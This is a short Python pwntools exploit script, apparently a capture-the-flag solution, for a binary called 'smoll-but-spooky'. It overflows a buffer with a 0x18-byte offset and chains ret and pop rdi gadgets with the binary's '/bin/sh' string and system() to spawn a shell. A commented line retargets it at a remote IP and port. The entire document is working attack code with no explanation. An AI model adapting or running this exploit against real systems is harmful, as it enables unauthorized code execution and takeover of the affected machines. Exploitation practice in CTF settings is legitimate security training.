from pwn import *
elf = context.binary = ELF('./smoll-but-spooky')

p = process('./smoll-but-spooky')
# p = remote("IP_ADDR", PORT)

offset = 0x18
ret_addr = p64(0x400479)                # ROPgadget --binary smoll-but-spooky | grep 'ret'
pop_rdi = p64(0x400683)                 # ROPgadget --binary smoll-but-spooky | grep 'pop rdi'
system = elf.sym["system"]
binsh = next(elf.search(b'/bin/sh'))

log.success(f"system_addr: {hex(system)}")
log.success(f"binsh_addr : {hex(binsh)}")

payload = flat(
    b'A' * offset,
    ret_addr, pop_rdi,
    binsh, system
)

p.sendlineafter(b"Is it that spooky?", payload)

p.interactive()